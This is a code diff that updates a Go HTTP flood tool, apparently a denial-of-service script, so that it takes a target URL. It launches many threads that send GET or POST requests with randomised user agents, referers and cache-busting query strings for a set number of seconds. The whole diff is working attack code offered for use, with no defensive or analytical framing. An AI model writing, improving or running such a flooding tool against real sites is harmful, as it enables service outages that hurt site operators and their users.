@@ -4,6 +4,9 @@ Please fking code ur script by ur self, kid.
 
 I changed the random integers range to the max of int32.
 Now 386 systems should work well.
+
+Looks like most people want to hit the url but not the host/ip.
+As a result, here you are.
 */
 package main
 
@@ -14,12 +17,18 @@ import (
 	"io"
 	"math/rand"
 	"net"
+	"net/url"
 	"os"
 	"strconv"
+	"strings"
 	"time"
 )
 
 var (
+	host      = ""
+	port      = "80"
+	page      = ""
+	mode      = ""
 	abcd      = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM"
 	start     = make(chan bool)
 	acceptall = []string{
@@ -38,7 +47,7 @@ var (
 		"Accept-Language: en-US,en;q=0.5\r\n",
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
 		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"}
-	page    string
+	key     string
 	choice  = []string{"Macintosh", "Windows", "X11"}
 	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
 	choice3 = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
@@ -118,20 +127,20 @@ func contain(char string, x string) int { //simple compare
 	return ans
 }
 
-func flood(ip, port, page, mode string) {
-	addr := ip + ":" + port
+func flood() {
+	addr := host + ":" + port
 	header := ""
 	if mode == "get" {
 		header += " HTTP/1.1\r\nHost: "
 		header += addr + "\r\n"
-		if os.Args[7] == "nil" {
+		if os.Args[5] == "nil" {
 			header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
 			header += "User-Agent: " + getuseragent() + "\r\n"
 			header += acceptall[rand.Intn(len(acceptall))]
 			header += referers[rand.Intn(len(referers))] + "\r\n"
 		} else {
 			func() {
-				fi, err := os.Open(os.Args[7])
+				fi, err := os.Open(os.Args[5])
 				if err != nil {
 					fmt.Printf("Error: %s\n", err)
 					return
@@ -149,9 +158,9 @@ func flood(ip, port, page, mode string) {
 		}
 	} else if mode == "post" {
 		data := ""
-		if os.Args[7] != "nil" {
+		if os.Args[5] != "nil" {
 			func() {
-				fi, err := os.Open(os.Args[7])
+				fi, err := os.Open(os.Args[5])
 				if err != nil {
 					fmt.Printf("Error: %s\n", err)
 					return
@@ -168,11 +177,9 @@ func flood(ip, port, page, mode string) {
 			}()
 
 		} else {
-			for x := 0; x > 100; x++ {
-				data += string(string(abcd[rand.Intn(len(abcd))]))
-			}
+			data = "f"
 		}
-		header := "POST " + os.Args[4] + " HTTP/1.1\r\nHost: " + addr + "\r\n"
+		header += "POST " + page + " HTTP/1.1\r\nHost: " + addr + "\r\n"
 		header += "Connection: Keep-Alive\r\nContent-Type: x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
 		header += "Accept-Encoding: gzip, deflate\r\n\n" + data + "\r\n"
 	}
@@ -183,7 +190,7 @@ func flood(ip, port, page, mode string) {
 		if port == "443" {
 			cfg := &tls.Config{
 				InsecureSkipVerify: true,
-				ServerName:         ip, //simple fix
+				ServerName:         host, //simple fix
 			}
 			s, err = tls.Dial("tcp", addr, cfg)
 		} else {
@@ -194,8 +201,8 @@ func flood(ip, port, page, mode string) {
 		} else {
 			for i := 0; i < 100; i++ {
 				request := ""
-				if os.Args[5] == "get" {
-					request += "GET " + os.Args[4] + page
+				if os.Args[3] == "get" {
+					request += "GET " + page + key
 					request += strconv.Itoa(rand.Intn(2147483647)) + string(string(abcd[rand.Intn(len(abcd))])) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))])
 				}
 				request += header + "\r\n"
@@ -214,33 +221,53 @@ func main() {
 	fmt.Println(" ||  ||    ||      ||     ||  ||      ||       ||  ||  || ||  || ||  ||  ")
 	fmt.Println(".||  ||.   `|..'   `|..'  ||..|'     .||.     .||. `|..|' `|..|' `|..||. ")
 	fmt.Println("                          ||                                             ")
-	fmt.Println("                         .||                     Golang version 1.9      ")
+	fmt.Println("                         .||                     Golang version 2.0      ")
 	fmt.Println("                                                        C0d3d By L330n123")
 	fmt.Println("==========================================================================")
-	if len(os.Args) != 8 {
+	if len(os.Args) != 6 {
 		fmt.Println("Post Mode will use header.txt as data")
 		fmt.Println("If you are using linux please run 'ulimit -n 999999' first!!!")
-		fmt.Println("Usage: ", os.Args[0], "<ip> <port> <threads> <page> <get/post> <seconds> <header.txt/nil>")
+		fmt.Println("Usage: ", os.Args[0], "<url> <threads> <get/post> <seconds> <header.txt/nil>")
 		os.Exit(1)
 	}
-	threads, err := strconv.Atoi(os.Args[3])
+	u, err := url.Parse(os.Args[1])
+	if err != nil {
+		println("Please input a correct url")
+	}
+	tmp := strings.Split(u.Host, ":")
+	host = tmp[0]
+	if u.Scheme == "https" {
+		port = "443"
+	} else {
+		port = u.Port()
+	}
+	if port == "" {
+		port = "80"
+	}
+	page = u.Path
+	if os.Args[3] != "get" && os.Args[3] != "post" {
+		println("Wrong mode, Only can use \"get\" or \"post\"")
+		return
+	}
+	mode = os.Args[3]
+	threads, err := strconv.Atoi(os.Args[2])
 	if err != nil {
 		fmt.Println("Threads should be a integer")
 	}
-	limit, err := strconv.Atoi(os.Args[6])
+	limit, err := strconv.Atoi(os.Args[4])
 	if err != nil {
 		fmt.Println("limit should be a integer")
 	}
-	if contain(os.Args[4], "?") == 0 {
-		page = "?"
+	if contain(page, "?") == 0 {
+		key = "?"
 	} else {
-		page = "&"
+		key = "&"
 	}
 	input := bufio.NewReader(os.Stdin)
 
 	for i := 0; i < threads; i++ {
 		time.Sleep(time.Microsecond * 100)
-		go flood(os.Args[1], os.Args[2], os.Args[4], os.Args[5]) // Start threads
+		go flood() // Start threads
 		fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
 		os.Stdout.Sync()
 		//time.Sleep( time.Millisecond * 1)
@@ -251,7 +278,7 @@ func main() {
 		fmt.Println(err)
 		return
 	}
-	fmt.Println("Flood will end in " + os.Args[6] + " seconds.")
+	fmt.Println("Flood will end in " + os.Args[4] + " seconds.")
 	close(start)
 	time.Sleep(time.Duration(limit) * time.Second)
 	//Keep the threads continue
